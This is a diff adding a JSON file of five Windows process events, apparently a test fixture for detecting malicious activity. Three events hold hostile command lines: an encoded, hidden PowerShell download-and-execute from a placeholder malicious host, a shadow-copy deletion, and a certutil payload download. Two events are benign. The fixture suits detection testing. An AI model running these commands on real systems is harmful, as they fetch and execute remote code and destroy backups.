@@ -1,0 +1,47 @@
+[
+  {
+    "eventId": "EVT-1001",
+    "timestamp": "2026-10-10T10:15:30",
+    "processName": "powershell.exe",
+    "parentProcessName": "cmd.exe",
+    "commandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQ==",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "eventId": "EVT-1002",
+    "timestamp": "2026-10-10T10:16:05",
+    "processName": "wmic.exe",
+    "parentProcessName": "powershell.exe",
+    "commandLine": "wmic.exe shadowcopy delete",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "processPath": "C:\\Windows\\System32\\wbem\\wmic.exe"
+  },
+  {
+    "eventId": "EVT-1003",
+    "timestamp": "2026-10-10T10:17:12",
+    "processName": "certutil.exe",
+    "parentProcessName": "cmd.exe",
+    "commandLine": "certutil.exe -urlcache -split -f http://malicious-server.org/payload.png payload.exe",
+    "user": "CORP\\Administrator",
+    "processPath": "C:\\Windows\\System32\\certutil.exe"
+  },
+  {
+    "eventId": "EVT-1004",
+    "timestamp": "2026-10-10T10:18:00",
+    "processName": "notepad.exe",
+    "parentProcessName": "explorer.exe",
+    "commandLine": "notepad.exe C:\\Users\\Administrator\\Desktop\\notes.txt",
+    "user": "CORP\\Administrator",
+    "processPath": "C:\\Windows\\System32\\notepad.exe"
+  },
+  {
+    "eventId": "EVT-1005",
+    "timestamp": "2026-10-10T10:19:45",
+    "processName": "git.exe",
+    "parentProcessName": "cmd.exe",
+    "commandLine": "git status",
+    "user": "CORP\\Developer",
+    "processPath": "C:\\Program Files\\Git\\cmd\\git.exe"
+  }
+]
